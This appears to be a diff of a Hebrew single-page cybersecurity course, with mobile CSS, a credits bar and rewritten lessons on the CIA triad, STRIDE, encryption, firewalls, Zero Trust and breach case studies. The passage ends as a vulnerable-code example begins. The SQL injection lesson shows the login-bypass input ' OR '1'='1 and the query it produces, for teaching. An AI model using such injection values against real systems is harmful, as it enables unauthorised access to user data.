@@ -218,12 +218,60 @@ body{font-family:var(--sans);background:var(--bg);color:var(--text);min-height:1
   .sidebar{transform:translateX(100%);transition:transform .25s;width:276px}
   .sidebar.open{transform:translateX(0)}
   .main{margin-right:0}
-  .tab-panels{padding:18px 16px 40px}
-  .ch-hero{padding:22px 16px 0}
+  .tab-panels{padding:14px 14px 60px}
+  .ch-hero{padding:18px 14px 0}
   .grid-2,.grid-3,.game-opts,.cheat-grid{grid-template-columns:1fr}
   .mobile-btn{display:flex}
   .header-xp{display:none}
-  .tabs-bar{overflow-x:auto}
+  /* tabs: scrollable, no wrap */
+  .tabs-bar{overflow-x:auto;-webkit-overflow-scrolling:touch;scrollbar-width:none}
+  .tabs-bar::-webkit-scrollbar{display:none}
+  .tab-btn{flex-shrink:0;padding:0 12px;font-size:11px}
+  /* tables scroll horizontally */
+  .table-wrap{overflow-x:auto;-webkit-overflow-scrolling:touch}
+  /* code blocks */
+  .code-block{font-size:11px;padding:12px;overflow-x:auto;-webkit-overflow-scrolling:touch}
+  /* flow diagrams: horizontal scroll */
+  .flow-row{overflow-x:auto;-webkit-overflow-scrolling:touch;flex-wrap:nowrap;gap:6px;padding:12px 10px}
+  .flow-step{min-width:68px;padding:8px 6px}
+  .flow-step-icon{font-size:16px}
+  .flow-step-label{font-size:9px}
+  .flow-arrow{font-size:13px;flex-shrink:0}
+  /* classify pool wraps nicely */
+  .classify-pool{gap:5px}
+  .classify-chip{font-size:11px;padding:4px 8px}
+  .classify-cats{grid-template-columns:1fr 1fr}
+  /* quiz/game options full width */
+  .quiz-opts,.mch-opts{gap:6px}
+  .quiz-opt,.mch-opt{font-size:12px;padding:9px 11px}
+  .quiz-q{font-size:13px}
+  .game-q{font-size:14px;min-height:40px}
+  .game-opts{gap:6px}
+  .game-opt{font-size:11px;padding:10px 8px}
+  /* order items */
+  .order-item{font-size:12px;padding:8px 10px}
+  /* hero text */
+  .ch-title{font-size:19px}
+  .ch-desc{font-size:12px}
+  /* cards */
+  .card{padding:13px}
+  .card-body{font-size:11px}
+  /* fill fields */
+  .fill-label{min-width:110px;font-size:11px}
+  .fill-input{font-size:11px}
+  /* cheat sheet single column on very small */
+}
+@media(max-width:480px){
+  .cheat-grid{grid-template-columns:1fr}
+  .classify-cats{grid-template-columns:1fr}
+  .tab-btn{padding:0 10px;font-size:10px}
+  .ch-title{font-size:17px}
+  .prose{font-size:13px}
+  .section-title{font-size:10px}
+  .lab-card{padding:14px}
+  .game-start-card{padding:24px 16px}
+  .game-over-card{padding:24px 16px}
+  .quiz-q-card{padding:16px}
 }
 
 /* ===== INTERACTIVE LAB ===== */
@@ -292,6 +340,16 @@ body{font-family:var(--sans);background:var(--bg);color:var(--text);min-height:1
 .mch-text{font-size:13px;color:var(--text-dim);line-height:1.4;flex:1}
 .mch-feedback{font-size:12px;color:var(--text-dim);line-height:1.6;padding:8px 12px;background:rgba(153,27,27,0.03);border-right:3px solid rgba(153,27,27,0.2);margin:0 0 4px;border-radius:3px;animation:fadeUp .15s ease}
 
+
+.credits-bar{background:var(--bg3);border-top:1px solid var(--border);padding:24px 36px;margin-top:40px}
+.credits-title{font-family:var(--display);font-size:10px;color:var(--accent);letter-spacing:2px;text-transform:uppercase;margin-bottom:12px;font-weight:700}
+.credits-grid{display:flex;flex-wrap:wrap;gap:20px}
+.credit-group{flex:1;min-width:160px}
+.credit-group-title{font-size:11px;font-weight:700;color:var(--text-dim);margin-bottom:6px;font-family:var(--display)}
+.credit-item{font-size:11px;color:var(--text-muted);line-height:1.7}
+.credit-item a{color:var(--accent2);text-decoration:none}
+.credit-item a:hover{text-decoration:underline}
+@media(max-width:860px){.credits-bar{padding:18px 14px}.credits-grid{flex-direction:column;gap:12px}}
 </style>
 </head>
 <body>
@@ -438,6 +496,41 @@ body{font-family:var(--sans);background:var(--bg);color:var(--text);min-height:1
     <div class="tab-panel" id="7-cheat"><div id="cheat-7"></div></div>
   </div>
 </section>
+<div class="credits-bar" id="credits-bar">
+  <div class="credits-title" id="credits-title-label">// Sources &amp; Credits</div>
+  <div class="credits-grid">
+    <div class="credit-group">
+      <div class="credit-group-title" id="credits-research">Research &amp; Standards</div>
+      <div class="credit-item">NIST Cybersecurity Framework</div>
+      <div class="credit-item">OWASP Foundation</div>
+      <div class="credit-item">MITRE ATT&amp;CK Framework</div>
+      <div class="credit-item">Verizon DBIR Annual Report</div>
+      <div class="credit-item">IBM Cost of Data Breach Report</div>
+    </div>
+    <div class="credit-group">
+      <div class="credit-group-title" id="credits-incidents">Incident Analysis</div>
+      <div class="credit-item">Colonial Pipeline — CISA Report</div>
+      <div class="credit-item">SolarWinds — FireEye Disclosure</div>
+      <div class="credit-item">WannaCry — NHS Digital Post-Incident</div>
+      <div class="credit-item">Equifax — US Senate Report 2018</div>
+      <div class="credit-item">Target — US Senate Commerce Report</div>
+    </div>
+    <div class="credit-group">
+      <div class="credit-group-title" id="credits-tech">Technical Docs</div>
+      <div class="credit-item"><a href="https://owasp.org/Top10" target="_blank">OWASP Top 10</a></div>
+      <div class="credit-item"><a href="https://csrc.nist.gov" target="_blank">NIST CSRC</div>
+      <div class="credit-item"><a href="https://attack.mitre.org" target="_blank">MITRE ATT&amp;CK</a></div>
+      <div class="credit-item"><a href="https://gdpr.eu" target="_blank">GDPR Official Text</a></div>
+    </div>
+    <div class="credit-group">
+      <div class="credit-group-title" id="credits-built">Built With</div>
+      <div class="credit-item">Claude (Anthropic) — content &amp; design</div>
+      <div class="credit-item">Vanilla JS + CSS — no frameworks</div>
+      <div class="credit-item">System fonts — no external dependencies</div>
+      <div class="credit-item" id="credits-version">Version 2.0 — 2025</div>
+    </div>
+  </div>
+</div>
 </main>
 <script>
 const C = {
@@ -466,329 +559,252 @@ he:{
   lbTitle:'// לוח תוצאות',labExplain:'💡 הסבר:',
   points:"נק'",of:'מתוך',question:'שאלה',
   optLetters:['א','ב','ג','ד'],playerName:'את',unknownPlayer:'שחקן',pct:'% נכון',
-  learn:[`
-<div class="did-you-know">💡 <strong>ידעת?</strong> 95% מהפרצות האבטחה מתחילות מטעות אנושית — לא מ-zero-day מתוחכם. הגורם האנושי הוא נקודת התורפה הגדולה ביותר בכל ארגון.</div>
+  learn:[
+`<div class="did-you-know">💡 <strong>ידעת?</strong> 95% מהפרצות האבטחה מתחילות מטעות אנושית — לא מפגיעות טכניות מתוחכמות. התוקפים לא פורצים דרך קוד מסובך. הם שולחים email שנראה כמו ממנהל שלך, ומחכים שתלחץ על הקישור.</div>
 
 <div class="section-title">CIA Triad — שלוש עמודות האבטחה</div>
-<p class="prose">כל החלטת אבטחה נשקלת נגד שלושה ערכים: Confidentiality (סודיות), Integrity (שלמות), ו-Availability (זמינות). הם לעתים קרובות סותרים אחד את השני.</p>
+<p class="prose">כל מערכת אבטחה בעולם, ממנעול דלת ועד מערכת בנקאית, נשפטת לפי שלושה קריטריונים בסיסיים. הם נקראים CIA Triad — לא הסוכנות האמריקאית, אלא ראשי תיבות של שלושה עקרונות שמגדירים מה זה "בטוח".</p>
+<p class="prose"><strong>Confidentiality (סודיות)</strong> — רק מי שמורשה יכול לראות את המידע. כשאת שולחת הודעה, רק הנמען צריך לקרוא אותה — לא הרשת, לא הספק, לא תוקף שמאזין. <strong>Integrity (שלמות)</strong> — המידע לא השתנה בדרך. כשאת מעבירה כסף, הסכום שהגיע הוא אותו סכום שנשלח — איש לא שינה "1,000 ש"ח" ל-"10,000 ש"ח" בזמן ההעברה. <strong>Availability (זמינות)</strong> — המערכת עובדת כשצריך אותה. בנק שמוצפן בצורה מושלמת אבל לא עובד שישה ימים בשבוע — כשל אבטחה.</p>
 <div class="grid-3">
-<div class="card"><div class="card-icon">🔒</div><div class="card-title">Confidentiality</div><div class="card-body">רק מי שמורשה יכול לגשת לנתונים. הצפנה, גישה מבוקרת, need-to-know. דוגמה: רפואי, פיננסי.</div></div>
-<div class="card"><div class="card-icon">✅</div><div class="card-title">Integrity</div><div class="card-body">הנתונים לא שונו ללא רשות. hashing, digital signatures, audit logs. דוגמה: עדכון תוכנה חתום.</div></div>
-<div class="card"><div class="card-icon">⚡</div><div class="card-title">Availability</div><div class="card-body">המערכת זמינה למורשים כשצריך. redundancy, DDoS protection, backups. דוגמה: בית חולים 24/7.</div></div>
+<div class="card"><div class="card-icon">🔒</div><div class="card-title">Confidentiality</div><div class="card-body">רק מי שמורשה יכול לגשת למידע. הפרה: גנבת נתוני לקוחות, דלף מסמכים פנימיים, האזנה לתקשורת.</div></div>
+<div class="card"><div class="card-icon">✅</div><div class="card-title">Integrity</div><div class="card-body">המידע לא השתנה ולא זויף. הפרה: שינוי עסקאות פיננסיות, זיוף לוגים, שינוי תוצאות בחירות.</div></div>
+<div class="card"><div class="card-icon">⚡</div><div class="card-title">Availability</div><div class="card-body">המערכת זמינה כשצריך. הפרה: מתקפת DDoS, ransomware שמצפין קבצים, כיבוי שרתים.</div></div>
 </div>
-<div class="callout callout-warn"><strong>⚠️ הסתירה המובנית:</strong> אבטחה מקסימלית פוגעת בזמינות. נעילת הכל = בטוח, אבל אי אפשר לעבוד. כל מדיניות אבטחה מאזנת בין השלושה.</div>
 
-<div class="section-title">Threat Modeling — לחשוב כמו תוקף</div>
-<p class="prose">לפני שמגנים, צריך להבין מה מגנים. STRIDE הוא מודל מיקרוסופט לזיהוי איומים:</p>
-<div class="table-wrap"><table class="data-table"><thead><tr><th>איום</th><th>משמעות</th><th>דוגמה</th><th>הגנה</th></tr></thead><tbody>
-<tr><td><strong>S</strong>poofing</td><td>התחזות</td><td>Email phishing</td><td>MFA, SPF/DKIM</td></tr>
-<tr><td><strong>T</strong>ampering</td><td>שינוי נתונים</td><td>Man-in-the-Middle</td><td>HTTPS, signing</td></tr>
-<tr><td><strong>R</strong>epudiation</td><td>הכחשת פעולה</td><td>"לא אני שלחתי"</td><td>Audit logs, timestamps</td></tr>
-<tr><td><strong>I</strong>nformation Disclosure</td><td>חשיפת מידע</td><td>Data breach</td><td>Encryption, ACL</td></tr>
-<tr><td><strong>D</strong>enial of Service</td><td>הפסקת שירות</td><td>DDoS attack</td><td>Rate limiting, CDN</td></tr>
-<tr><td><strong>E</strong>levation of Privilege</td><td>הסלמת הרשאות</td><td>sudo exploit</td><td>Least privilege</td></tr>
+<div class="section-title">STRIDE — לחשוב כמו תוקף</div>
+<p class="prose">לפני שאפשר להגן, צריך להבין מה מאיים. STRIDE הוא מודל שפותח ב-Microsoft לזיהוי שישה סוגי איומים. הרעיון: עוברים על כל חלק במערכת ושואלים "איך אפשר לתקוף את זה?" — ורק אחרי שמבינים את האיומים, מתכננים את ההגנות.</p>
+<div class="table-wrap"><table class="data-table"><thead><tr><th>איום</th><th>משמעות</th><th>דוגמה</th><th>עיקרון CIA שנפגע</th></tr></thead><tbody>
+<tr><td><strong>S</strong>poofing</td><td>התחזות לזהות אחרת</td><td>email שנראה כממנהל</td><td>Confidentiality</td></tr>
+<tr><td><strong>T</strong>ampering</td><td>שינוי נתונים ללא רשות</td><td>שינוי עסקה בזמן מעבר</td><td>Integrity</td></tr>
+<tr><td><strong>R</strong>epudiation</td><td>הכחשת פעולה שבוצעה</td><td>"לא אני שלחתי את ההעברה"</td><td>Integrity</td></tr>
+<tr><td><strong>I</strong>nformation Disclosure</td><td>דלף מידע</td><td>קובץ config עם סיסמאות</td><td>Confidentiality</td></tr>
+<tr><td><strong>D</strong>enial of Service</td><td>השבתת שירות</td><td>הצפת שרת עד קריסה</td><td>Availability</td></tr>
+<tr><td><strong>E</strong>levation of Privilege</td><td>השגת הרשאות גבוהות</td><td>user רגיל שהופך לadmin</td><td>כל השלושה</td></tr>
 </tbody></table></div>
 
-<div class="section-title">Defense in Depth — הגנה בשכבות</div>
-<div class="flow-row">
-  <div class="flow-step"><div class="flow-step-icon">🌐</div><div class="flow-step-label">Perimeter<br>Firewall, WAF</div></div>
-  <div class="flow-arrow">→</div>
-  <div class="flow-step"><div class="flow-step-icon">🔗</div><div class="flow-step-label">Network<br>Segmentation</div></div>
-  <div class="flow-arrow">→</div>
-  <div class="flow-step"><div class="flow-step-icon">🖥️</div><div class="flow-step-label">Endpoint<br>AV, EDR</div></div>
-  <div class="flow-arrow">→</div>
-  <div class="flow-step"><div class="flow-step-icon">💾</div><div class="flow-step-label">Data<br>Encryption</div></div>
-  <div class="flow-arrow">→</div>
-  <div class="flow-step"><div class="flow-step-icon">👤</div><div class="flow-step-label">Identity<br>MFA, RBAC</div></div>
-</div>
-<div class="callout callout-info"><strong>💡 הרעיון:</strong> תוקף שעובר שכבה אחת עדיין נתקל בחמש נוספות. אין הגנה מושלמת — אבל כל שכבה מוסיפה זמן, עלות ורעש לתוקף.</div>
+<div class="section-title">Defense in Depth — לא מספיק חומה אחת</div>
+<p class="prose">הטעות הנפוצה ביותר בתכנון אבטחה היא להסתמך על שכבת הגנה אחת חזקה. אם היא נפרצת — הכל חשוף. Defense in Depth (הגנה בעומק) אומר: כמה שכבות הגנה, כך שכשאחת נכשלת — השנייה עדיין מחזיקה.</p>
 
-<div class="incident-box">
-  <div class="incident-title">🔥 אירוע אמיתי: Colonial Pipeline — מאי 2021</div>
-  <div class="incident-body">
-    Colonial Pipeline — צינור הדלק הגדול בארה"ב — הושבת על ידי ransomware. הגישה הראשונית: VPN account ישן עם סיסמה שדלפה, ללא MFA. 5.5 מיליון דולר כופר שולמו.<br><br>
-    <strong>הלקחים:</strong> (1) MFA על כל VPN — חובה. (2) accounts ישנים שלא בשימוש — מחיקה. (3) network segmentation — ה-IT וה-OT (מערכות תפעוליות) לא אמורים לתקשר ישירות. ארגון קריטי כמו צינור דלק לא יכול להרשות single point of failure.
+<div class="real-world-box">
+  <div class="real-world-title">🌍 Case Study: Colonial Pipeline — כיצד מתקפת Ransomware עצרה דלק בחצי אמריקה</div>
+  <div class="real-world-body">
+    במאי 2021 השביתה מתקפת ransomware את Colonial Pipeline — הצינור הגדול ביותר לאספקת דלק בחוף המזרחי של ארה"ב. 45% מאספקת הדלק לאיסט קוסט הופסקה. בתחנות דלק היו תורים. מחירי הדלק קפצו.<br><br>
+    הסיבה: פרטי כניסה ישנים של VPN שלא בוטלו — עם סיסמה שנמצאה ב-Dark Web. הקבוצה DarkSide כבשה את הרשת, הצפינה קבצים, ודרשה $4.4 מיליון. Colonial שילמה. חלק מהכסף שוחזר לאחר מכן על ידי ה-FBI. <strong>הלקח: multi-factor authentication על VPN עלתה פחות מדולר אחד. הנזק עלה עשרות מיליונים.</strong>
   </div>
 </div>`,
+`<div class="did-you-know">💡 <strong>ידעת?</strong> כשאת שולחת הודעה ב-WhatsApp, גם WhatsApp עצמה לא יכולה לקרוא אותה. ההצפנה קורית על המכשיר שלך לפני שההודעה יוצאת לרשת. זה End-to-End Encryption — ורק את והנמען מחזיקים את המפתח לפתיחתה.</div>
 
-`<div class="did-you-know">💡 <strong>ידעת?</strong> כשאת שולחת WhatsApp, הוא מוצפן עם פרוטוקול Signal. WhatsApp עצמה לא יכולה לקרוא את ההודעות שלך. זה End-to-End Encryption — אפילו לחברה שבנתה את האפליקציה אין גישה לתוכן.</div>
-
-<div class="section-title">Symmetric Encryption — מפתח אחד</div>
-<p class="prose">AES (Advanced Encryption Standard) הוא הstandard לסימטרי. אותו מפתח מצפין ומפענח. מהיר ויעיל, אבל דורש שיתוף מפתח מראש.</p>
+<div class="section-title">Symmetric Encryption — מפתח אחד לשניהם</div>
+<p class="prose">הצפנה סימטרית היא הסוג הפשוט ביותר: אותו מפתח מצפין ומפענח. אם שלחת לחברה מכתב מקודד בשיטה שסיכמתם מראש, שניכם משתמשים באותה שיטה. זה מהיר ויעיל, אבל יש בעיה אחת גדולה: איך מעבירים את המפתח בבטחה בפעם הראשונה?</p>
 <div class="grid-2">
-<div class="card"><div class="card-icon">🔑</div><div class="card-title">AES-256</div><div class="card-body">128-bit block, 256-bit key. משמש בTLS, BitLocker, ZIP מוצפן. <strong>מהיר מאוד בחומרה.</strong> NSA מאשר לCLASSIFIED TOP SECRET.</div></div>
-<div class="card"><div class="card-icon">⚡</div><div class="card-title">Modes of Operation</div><div class="card-body"><strong>ECB</strong> — אינו בטוח, patterns גלויים.<br><strong>CBC</strong> — טוב, אבל לא מקבילי.<br><strong>GCM</strong> — המומלץ: מהיר + Authenticated Encryption.</div></div>
+<div class="card"><div class="card-icon">🔑</div><div class="card-title">AES — תקן ההצפנה העולמי</div><div class="card-body">AES-256 הוא ה-standard של הממשלה האמריקאית ורוב העולם. פריצה בכוח גס תדרוש יותר זמן מגיל היקום. מה שבנק, VPN, ו-WhatsApp משתמשים בו.</div></div>
+<div class="card"><div class="card-icon">⚡</div><div class="card-title">למה סימטרית מהירה?</div><div class="card-body">הצפנה סימטרית מהירה פי 1000+ מאסימטרית. לכן ב-HTTPS: הצפנה אסימטרית רק להחלפת המפתח, ואחרי כן הכל בAES מהיר.</div></div>
 </div>
 
-<div class="section-title">Asymmetric Encryption — מפתח ציבורי/פרטי</div>
-<p class="prose">RSA ו-ECC: כל אחד מחזיק public key (ניתן לשיתוף חופשי) ו-private key (סודי לחלוטין). מה שמוצפן עם public key — רק ה-private key מפענח. <strong>הבסיס של HTTPS, SSH, ו-Code Signing.</strong></p>
-<pre class="code-block"><code><span class="comment"># TLS Handshake — איך HTTPS עובד</span>
-1. Client → Server: "Hello" + supported cipher suites
-2. Server → Client: Certificate (contains public key)
-3. Client: <span class="key">verifies certificate</span> against trusted CA
-4. Client → Server: <span class="val">session key encrypted with server's public key</span>
-5. Server: decrypts session key with <span class="key">private key</span>
-6. Both: now use fast <span class="val">AES symmetric encryption</span>
+<div class="section-title">Asymmetric Encryption — פתרון בעיית ההפצה</div>
+<p class="prose">הצפנה אסימטרית פותרת את הבעיה של "איך מעבירים מפתח בבטחה" בדרך גאונית: לכל צד יש שני מפתחות. מפתח ציבורי שאפשר לפרסם לכולם, ומפתח פרטי שנשמר בסוד. מה שמוצפן במפתח הציבורי — רק המפתח הפרטי יכול לפתוח. כך אפשר לקבל הודעות מוצפנות מכולם מבלי להעביר סודות מראש.</p>
+<pre class="code-block"><code><span class="comment"># HTTPS Handshake — כיצד האינטרנט מוצפן</span>
+1. דפדפן ← שרת: "שלח לי את המפתח הציבורי שלך"
+2. שרת ← דפדפן: 📜 Certificate + Public Key
+3. דפדפן: מאמת Certificate, מייצר Session Key
+4. דפדפן ← שרת: Session Key מוצפן ב-Public Key
+5. שרת: מפענח עם Private Key
+6. ← הכל מוצפן עם Session Key ←
+<span class="comment"># מכאן: AES מהיר עם Session Key שניהם יודעים</span></code></pre>
 
-<span class="comment"># RSA vs ECC comparison</span>
-RSA-2048  = 2048 bit key, older, slower
-ECC-256   = 256 bit key, same security as RSA-3072
-Ed25519   = modern ECC, used in SSH, Signal</code></pre>
+<div class="section-title">Hashing — טביעת אצבע חד-כיוונית</div>
+<p class="prose">Hash function לוקחת כל קלט ומייצרת "טביעת אצבע" — מחרוזת קצרה וקבועה שמייצגת אותו. שינוי תו אחד משנה לחלוטין את ה-hash. וחשוב מכל: לא ניתן להחזיר את המידע המקורי מה-hash. לכן סיסמאות מאוחסנות כhash — גם אם מסד הנתונים נגנב, הסיסמאות האמיתיות לא חשופות.</p>
+<pre class="code-block"><code><span class="comment"># Hashing בפועל</span>
+SHA-256(<span class="str">"password123"</span>) = ef92b778bafe771...
+SHA-256(<span class="str">"password124"</span>) = d7a1e7b4b3c9f2...
+<span class="comment"># שינוי תו אחד ← hash שונה לחלוטין ← Avalanche Effect</span>
 
-<div class="section-title">Hashing — חתימה חד-כיוונית</div>
-<div class="table-wrap"><table class="data-table"><thead><tr><th>אלגוריתם</th><th>Output</th><th>מצב</th><th>שימוש</th></tr></thead><tbody>
-<tr><td>MD5</td><td>128 bit</td><td><span class="threat-badge badge-critical">שבור</span></td><td>לגמרי לא לאבטחה</td></tr>
-<tr><td>SHA-1</td><td>160 bit</td><td><span class="threat-badge badge-critical">שבור</span></td><td>deprecated</td></tr>
-<tr><td>SHA-256</td><td>256 bit</td><td><span class="threat-badge badge-low">בטוח</span></td><td>Git, certificates</td></tr>
-<tr><td>SHA-3</td><td>256-512 bit</td><td><span class="threat-badge badge-low">בטוח</span></td><td>NIST standard</td></tr>
-<tr><td>bcrypt</td><td>184 bit</td><td><span class="threat-badge badge-low">בטוח</span></td><td>סיסמאות בלבד</td></tr>
-<tr><td>Argon2</td><td>variable</td><td><span class="threat-badge badge-low">מומלץ</span></td><td>סיסמאות — הכי טוב</td></tr>
-</tbody></table></div>
+<span class="comment"># bcrypt לסיסמאות — מכוון להיות איטי!</span>
+bcrypt(<span class="str">"mypassword"</span>, rounds=12) → <span class="val">$2b$12$...</span>
+<span class="comment"># איטי בכוונה: brute force עולה שנים, לא שניות</span></code></pre>
 
-<div class="incident-box">
-  <div class="incident-title">🔥 אירוע אמיתי: SHA-1 Collision — Google SHAttered (2017)</div>
-  <div class="incident-body">
-    ב-2017, גוגל הדגימה ש-SHA-1 שבור לחלוטין: הם יצרו שני קבצי PDF שונים עם אותו SHA-1 hash. תוקף יכול לייצר מסמך זדוני עם hash זהה למסמך לגיטימי.<br><br>
-    <strong>עלות ה-collision:</strong> 6,500 שנות מחשוב בCPU, 110 שנות GPU — אפשרי לגורמים ממומנים. Chrome, Firefox ו-CA/Browser Forum אסרו SHA-1 לחלוטין.
+<div class="real-world-box">
+  <div class="real-world-title">🌍 Case Study: SolarWinds — מתקפת שרשרת האספקה</div>
+  <div class="real-world-body">
+    ב-2020 גילתה FireEye מתקפה שהחלה 9 חודשים קודם לכן: האקרים (המיוחסים לרוסיה) חדרו לתוכנת ניהול רשת SolarWinds Orion, הכניסו קוד זדוני לתוך ה-update הרשמי, ו-18,000 ארגון — כולל משרדי ממשלה אמריקאים — התקינו את ה-update הנגוע.<br><br>
+    הקוד חיכה 2 שבועות לפני הפעלה, כדי לא להיתפס. הנתונים שנגנבו כללו מיילים ממשרדי ממשלה, חברות נשק, ותשתיות קריטיות. <strong>הלקח: Code signing — חתימה דיגיטלית על כל עדכון תוכנה — היה מונע את ההפצה.</strong>
   </div>
 </div>`,
+`<div class="did-you-know">💡 <strong>ידעת?</strong> כשאת מתחברת ל-WiFi בבית קפה, כל ה-traffic שלך עובר דרך הנתב שם. ללא HTTPS ו-VPN, כל מי שמחובר לאותה רשת יכול, עם הכלים הנכונים, לראות לאיזה אתרים את גולשת ומה את שולחת. זה לא תאוריית קונספירציה — זה TCP/IP בסיסי.</div>
 
-`<div class="did-you-know">💡 <strong>ידעת?</strong> כשאת מתחברת ל-WiFi בבית קפה, כל ה-traffic שלך עובר דרך הנתב שם. ללא HTTPS ו-VPN, בעל בית הקפה (או כל מי שמחובר לאותה רשת) יכול לראות את כל מה שאת עושה.</div>
-
-<div class="section-title">Firewalls — שומרי הרשת</div>
+<div class="section-title">Firewalls — שומרי הכניסה לרשת</div>
+<p class="prose">Firewall הוא שומר שבודק כל packet של מידע שנכנס ויוצא מהרשת. הוא פועל לפי כללים: "תנועה מ-IP זה — חסום. תנועה לPort 443 — אפשר. כל השאר — חסום." ה-Firewall לא רואה את תוכן ההצפנה, אבל הוא רואה: מאיפה, לאן, ובאיזה שפה.</p>
 <div class="grid-2">
-<div class="card"><div class="card-icon">🔥</div><div class="card-title">Stateless Firewall</div><div class="card-body">בודק כל packet בנפרד לפי IP/Port. מהיר, אבל לא מבין context. לא מזהה: port scanning, IP spoofing, fragmented packets.</div></div>
-<div class="card"><div class="card-icon">🧠</div><div class="card-title">Stateful Firewall</div><div class="card-body">עוקב אחר connections. יודע ש-ACK packet בלי SYN מוקדם = חשוד. הרוב המכריע של firewalls מודרניים.</div></div>
-<div class="card"><div class="card-icon">🔍</div><div class="card-title">NGFW / WAF</div><div class="card-body">Next-Gen Firewall: Deep Packet Inspection, Application Awareness, IPS מובנה, SSL Inspection. WAF מגן ספציפית על web apps.</div></div>
-<div class="card"><div class="card-icon">🕵️</div><div class="card-title">IDS vs IPS</div><div class="card-body"><strong>IDS</strong> = Intrusion Detection — מזהה ומתריע.<br><strong>IPS</strong> = Intrusion Prevention — מזהה <em>וחוסם</em>. IPS inline = יכול לחסום legitimate traffic.</div></div>
+<div class="card"><div class="card-icon">🧱</div><div class="card-title">Stateless Firewall</div><div class="card-body">בודק כל packet בנפרד לפי כללים קבועים. מהיר אבל עיוור להקשר. לא יודע אם ה-packet הוא חלק משיחה לגיטימית או ניסיון פריצה.</div></div>
+<div class="card"><div class="card-icon">🔍</div><div class="card-title">Stateful / NGFW</div><div class="card-body">מעקב אחרי שיחות שלמות. Next-Gen Firewalls גם מנתחים תוכן, מזהים אפליקציות, ומשלבים Intrusion Detection. הסטנדרט כיום.</div></div>
 </div>
 
 <div class="section-title">Zero Trust — "לעולם אל תסמוך, תמיד תאמת"</div>
-<p class="prose">המודל הישן: "כל מה שבתוך הרשת — בטוח". Zero Trust: <strong>לא סומכים על אף אחד, בתוך הרשת או מחוצה לה</strong>, ללא authentication וauthorization מפורשים.</p>
-<div class="flow-row">
-  <div class="flow-step"><div class="flow-step-icon">👤</div><div class="flow-step-label">Verify Identity<br>MFA תמיד</div></div>
-  <div class="flow-arrow">→</div>
-  <div class="flow-step"><div class="flow-step-icon">📱</div><div class="flow-step-label">Check Device<br>Health, MDM</div></div>
-  <div class="flow-arrow">→</div>
-  <div class="flow-step"><div class="flow-step-icon">📍</div><div class="flow-step-label">Verify Context<br>Location, Time</div></div>
-  <div class="flow-arrow">→</div>
-  <div class="flow-step"><div class="flow-step-icon">🔐</div><div class="flow-step-label">Least Privilege<br>מינימום הרשאות</div></div>
-  <div class="flow-arrow">→</div>
-  <div class="flow-step"><div class="flow-step-icon">📊</div><div class="flow-step-label">Monitor All<br>Continuous</div></div>
-</div>
+<p class="prose">המודל הישן של אבטחת רשת אמר: מי שנמצא בתוך הרשת — בטוח. מי שבחוץ — לא. Zero Trust הופך את זה לגמרי: אף אחד לא מהימן מראש, בין שהוא בתוך הרשת ובין שבחוץ. כל בקשה צריכה להוכיח את עצמה מחדש — זהות, מכשיר, הקשר — בכל פעם.</p>
+<p class="prose">הסיבה למעבר: תוקפים כבר מזמן למדו להיכנס לרשת הפנימית דרך phishing, VPN גנוב, או מכשיר עובד שנפגע. ברגע שהם בפנים — עם מודל הישן הם יכולים לנוע חופשית. Zero Trust מחייב אותם להוכיח זהות בכל צעד.</p>
 
-<div class="incident-box">
-  <div class="incident-title">🔥 אירוע אמיתי: SolarWinds Supply Chain Attack — 2020</div>
-  <div class="incident-body">
-    האקרים רוסיים (APT29/Cozy Bear) חדרו לSolarWinds ושתלו backdoor ב-Orion software update. 18,000 ארגונים התקינו את ה-update הנגוע, כולל Microsoft, Intel, CISA ו-Treasury Department.<br><br>
-    <strong>מדוע Zero Trust היה מגן:</strong> ה-backdoor יצר lateral movement בתוך הרשת — ועם Zero Trust ו-micro-segmentation, תנועה כזו בין systems היתה נחסמת ומזוהה מיידית. Trust המרומז = הסיבה לנזק הקטסטרופלי.
+<div class="section-title">VPN, TLS, ו-HTTPS — ההצפנה בשכבות</div>
+<pre class="code-block"><code><span class="comment"># מה הן שכבות הגנת הרשת בפועל</span>
+HTTPS = HTTP + TLS
+<span class="comment"># TLS: מוצפן בין דפדפן לשרת. ISP רואה לאיזה domain, לא מה</span>
+
+VPN = Encrypted tunnel לשרת ביניים
+<span class="comment"># כל ה-traffic עובר מוצפן לVPN server</span>
+<span class="comment"># ISP רואה: VPN traffic. לא לאן ולא מה.</span>
+
+DNS over HTTPS (DoH)
+<span class="comment"># גם שאילתות DNS מוצפנות. ISP לא רואה אפילו domain names</span></code></pre>
+
+<div class="real-world-box">
+  <div class="real-world-title">🌍 Case Study: WannaCry — כשרשת שלמה נפלה ב-74 דקות</div>
+  <div class="real-world-body">
+    במאי 2017 תקפה WannaCry 200,000+ מחשבים ב-150 מדינות תוך יום אחד. NHS (מערכת הבריאות הבריטית) נפלה — ניתוחים בוטלו, מחשבי חדרי מיון הפסיקו לעבוד. FedEx, Telefonica, Renault — כולם נפגעו.<br><br>
+    הפרצה: EternalBlue — exploit ב-SMB פרוטוקול של Windows שה-NSA פיתח ולא גילה למיקרוסופט. הוא דלף ופורסם חודשיים קודם. מיקרוסופט הוציאה patch — אבל NHS לא עדכן. <strong>הלקח: עדכוני אבטחה הם לא "nice to have". הם קו ההגנה הראשון והזול ביותר.</strong>
   </div>
 </div>`,
+`<div class="did-you-know">💡 <strong>ידעת?</strong> OWASP Top 10 — רשימת 10 הפגיעויות הנפוצות ביותר באפליקציות Web — גורמת לנזקים של מעל 3 מיליארד דולר בשנה. SQL Injection, שהתגלה ב-1998, עדיין מופיע ב-Top 10 ב-2025. הפרצה הכי ישנה בספר עדיין רלוונטית — כי אנשים עדיין כותבים קוד שגוי.</div>
 
-`<div class="did-you-know">💡 <strong>ידעת?</strong> OWASP Top 10 עולה כ-3 מיליארד דולר בנזקים שנתיים. SQL Injection — שהתגלה ב-1998 — עדיין נמצא ב-Top 10. הפרצה הכי ישנה בספר עדיין רלוונטית ב-2024.</div>
+<div class="section-title">SQL Injection — כשהקלט הופך לפקודה</div>
+<p class="prose">SQL Injection קורה כשמשתמש מזין קוד SQL במקום נתונים רגילים, ואפליקציה שלא מוגנת מריצה אותו. נניח שאתר בונה שאילתה כזו: <code>SELECT * FROM users WHERE username='[input]'</code>. אם המשתמש מזין <code>' OR '1'='1</code> — השאילתה הופכת ל-<code>WHERE username='' OR '1'='1'</code>, שמחזיר את כל המשתמשים. ניתן כך לעקוף סיסמאות, לגנוב מסדי נתונים שלמים, ולמחוק טבלאות.</p>
+<pre class="code-block"><code><span class="comment"># ❌ קוד פגיע — מחרוזת ישירה</span>
